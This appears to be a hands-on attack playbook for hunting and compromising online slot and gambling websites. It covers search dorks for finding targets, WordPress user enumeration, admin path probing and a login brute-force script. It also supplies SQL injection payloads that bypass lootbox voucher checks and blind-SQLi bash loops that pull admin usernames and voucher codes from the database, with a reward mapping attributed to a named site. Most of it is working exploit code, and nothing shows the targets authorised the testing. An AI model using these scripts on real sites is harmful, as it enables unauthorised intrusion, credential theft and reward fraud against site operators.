# Slot/Gambling Site Hunting Patterns

## Discovery Queries (Exa API)

```python
queries = [
    'site:.xyz slot online login',
    'site:.top slot online login',
    'site:.icu slot online login',
    'site:.online slot online login',
    'intitle:"slot" intext:"login" site:.xyz OR site:.top OR site:.icu',
    'intitle:"slot" intext:"daftar" site:.xyz OR site:.top OR site:.icu',
    'inurl:login intext:"slot" site:.xyz OR site:.top',
    'intext:"slot gacor" site:.xyz OR site:.top OR site:.icu',
    'intext:"slot online" intext:"login" site:.xyz OR site:.top',
]
```

## WordPress Detection + User Enumeration

```bash
# Check if WordPress
curl -s -o /dev/null -w "%{http_code}" "https://target/wp-login.php"

# Enumerate users via REST API
curl -s "https://target/wp-json/wp/v2/users" | grep -o '"slug":"[^"]*"'

# Common slot site usernames
# - admin + site name (e.g., adminslotking333)
# - site name (e.g., megaslot888)
# - admin + number (e.g., admin123)
```

## Common Admin Paths

```bash
for path in /admin /administrator /wp-admin /wp-login.php /phpmyadmin /pma /adminer /cpanel /webmail; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "https://target$path")
    echo "$code $path"
done
```

## False Positive Detection

Many gambling sites return 200 for ALL URLs with custom 404 pages:

```bash
# Test with random path
curl -s "https://target/xyzrandom123" | head -5
# If returns HTML with "404" or "Not Found" → custom 404 page

# Verify actual content
content=$(curl -s "https://target/.env" | head -5)
if echo "$content" | grep -q "404\|Not Found\|<!DOCTYPE"; then
    echo "Custom 404 page, not actual .env"
fi
```

## WordPress Brute Force

```python
import requests

url = "https://target/wp-login.php"
username = "adminslotking333"  # From REST API enumeration

data = {
    "log": username,
    "pwd": password,
    "wp-submit": "Log In",
    "redirect_to": "https://target/wp-admin/",
    "testcookie": "1",
}

r = requests.post(url, data=data, headers=headers, timeout=10, allow_redirects=False)

# Success = 302 redirect to wp-admin
if r.status_code == 302 and "wp-admin" in r.headers.get("Location", ""):
    print("SUCCESS!")
```

## Pitfalls

- Many slot sites use WAF (returns 403)
- Custom 404 pages return 200 for all paths
- WordPress REST API may be disabled on some sites
- Brute force may be rate-limited
- Always check for user enumeration before brute force

## PHP Lootbox/Voucher SQL Injection

Many gambling sites have a "mystery box" or "lootbox" feature with voucher codes. These are often PHP apps with SQL injection in the voucher field.

### Voucher Bypass Payloads
```python
# MySQL comment styles: # works, -- often fails (needs space after)
payloads = [
    "' OR '1'='1",      # No comment - works if query ends there
    "' OR '1'='1'#",    # MySQL hash comment
    "' OR 1=1#",        # Numeric comparison
    "x' OR '1'='1",     # Prefix variation
    "x' OR '1'='1'#",   # Prefix + comment
]
```

### Detection
```
# 302 redirect = SUCCESS (voucher accepted, redirect to game page)
# 500 error = SQL syntax error (injection confirmed, wrong payload)
# 200 with same page = FAILED (no injection or WAF blocked)
```

### Pitfall: `--` vs `#`
MySQL `--` comment requires a space after it (`-- `). Many PHP apps fail with `--` but work with `#`. Always try `#` first.

### Pitfall: Session Required
PHP apps need valid session cookies. Always:
1. GET the page first (get PHPSESSID cookie)
2. POST the SQLi payload with the same cookie
3. GET the result page with the same cookie

### Full Exploitation Flow
```python
import requests
s = requests.Session()

# 1. Get session
s.get(f"{target}/index.php")

# 2. SQLi voucher bypass
s.post(f"{target}/index.php", data={"voucher": "' OR '1'='1"})

# 3. Open box
s.post(f"{target}/index.php", data={"open_box": "1"})

# 4. Check result (reward shown via JavaScript animation)
r = s.get(f"{target}/index.php")
```

### What to Look For in Source Code
- `inc/config.php` — DB credentials
- `admin/login.php` — SQLi in username field
- `admin/vouchers.php` — SQLi in INSERT/UPDATE/DELETE
- `admin/rewards.php` — Unrestricted file upload
- `error_log` — File path disclosure, debug info

### Blind SQLi for Data Extraction
When you need to extract data from the database (voucher codes, admin credentials, etc.):

```bash
# OR-based blind SQLi — returns TRUE if condition is true
test_or() {
    COOKIES=$(mktemp)
    curl -s -c "$COOKIES" "$TARGET/index.php" -H "User-Agent: Mozilla/5.0" --max-time 8 > /dev/null 2>&1
    RESP=$(curl -s -b "$COOKIES" -c "$COOKIES" -X POST "$TARGET/index.php" \
      -H "User-Agent: Mozilla/5.0" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --data-urlencode "voucher=' OR ($1)#" \
      --max-time 8 2>/dev/null)
    SIZE=$(echo "$RESP" | wc -c)
    rm -f "$COOKIES"
    
    if [ "$SIZE" -lt 100 ]; then
        echo "TRUE"  # Redirect = condition true
    else
        echo "FALSE" # Same page = condition false
    fi
}

# Extract database version
test_or "SUBSTRING(version(),1,1)='5'"

# Extract table count
test_or "(SELECT COUNT(*) FROM rewards)=16"

# Extract admin username character by character
CHARSET="abcdefghijklmnopqrstuvwxyz0123456789"
for pos in $(seq 1 15); do
    for c in $(echo $CHARSET | fold -w1); do
        if [ "$(test_or "SUBSTRING((SELECT username FROM admins LIMIT 0,1),$pos,1)='$c'")" = "TRUE" ]; then
            echo -n "$c"
            break
        fi
    done
done
```

### Reward ID Manipulation
If the lootbox uses `reward_id` to determine rewards:
```sql
-- Check if specific reward_id exists
' AND reward_id=1 AND '1'='1

-- Extract voucher code for specific reward
' AND (SELECT COUNT(*) FROM vouchers WHERE reward_id=3 AND is_used=0)>0 AND '1'='1
```

**Reward ID Mapping** (from mysteryboxunsurhoki.org):
```
reward_id=1  → FREE SALDO 1.000.000
reward_id=2  → ZONK, Coba Lagi!!!
reward_id=3  → Freechip 500.000
reward_id=4  → Freechip 350.000
reward_id=5  → Freechip 100.000
reward_id=6  → Freechip 5.000.000
reward_id=7  → Freechip 75.000
reward_id=8  → Freechip 15.000
reward_id=9  → Freechip 50.000.000
reward_id=10 → IPHONE 15 PROmax
reward_id=11 → Yamaha NMax Turbo
reward_id=12 → Laptop Gaming
reward_id=13 → Freechip 250.000
reward_id=14 → Freechip 10.000.000
reward_id=15 → Freechip 88.000
reward_id=16 → Freechip 5.000
```

**Pitfall**: If no voucher exists with the target reward_id, you can't force that reward. The SQLi only works if there's a voucher in the database with that reward_id.

### Voucher Code Extraction via Blind SQLi
Use OR-based boolean blind SQLi to extract voucher codes character by character:
```bash
# Test if condition is true (page shows box form = TRUE)
test_or() {
    COOKIES=$(mktemp)
    curl -s -c "$COOKIES" "$TARGET/index.php" -H "User-Agent: Mozilla/5.0" --max-time 8 > /dev/null 2>&1
    RESP=$(curl -s -b "$COOKIES" -c "$COOKIES" -X POST "$TARGET/index.php" \
      -H "User-Agent: Mozilla/5.0" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --data-urlencode "voucher=' OR ($1)#" \
      --max-time 8 2>/dev/null)
    SIZE=$(echo "$RESP" | wc -c)
    rm -f "$COOKIES"
    
    if [ "$SIZE" -lt 100 ]; then
        echo "TRUE"  # Redirect = condition true
    else
        echo "FALSE" # Same page = condition false
    fi
}

# Extract voucher code character by character
CHARSET="abcdefghijklmnopqrstuvwxyz0123456789"
CODE=""
for pos in $(seq 1 15); do
    FOUND=0
    for c in $(echo $CHARSET | fold -w1); do
        RESULT=$(test_or "SUBSTRING((SELECT code FROM vouchers WHERE reward_id=2 LIMIT 1),$pos,1)='$c'")
        if [ "$RESULT" = "TRUE" ]; then
            CODE="${CODE}${c}"
            FOUND=1
            break
        fi
    done
    if [ "$FOUND" -eq 0 ]; then
        break
    fi
done
echo "Voucher code: $CODE"
```

**Speed**: ~2 seconds per character × 36 charset chars = ~72 seconds per position. For a 6-char code, that's ~7 minutes.

**Pitfall**: If all vouchers are used (`is_used=1` or `max_use <= used_count`), extraction still works but the codes are useless.

### Pitfall: All Vouchers Used
If `SELECT COUNT(*) FROM vouchers WHERE is_used=0 OR max_use>used_count` returns 0, all vouchers are exhausted. The SQLi bypass (`' OR '1'='1'#`) still works but gives random rewards.

### Pitfall: Reward Display via JavaScript
Rewards are often displayed via JavaScript animation, not in HTML. Check for:
- `class="text-success"` — Winner reward name
- `class="zonk-text"` — Zonk (no reward)
- `Main Lagi` button — Indicates result page
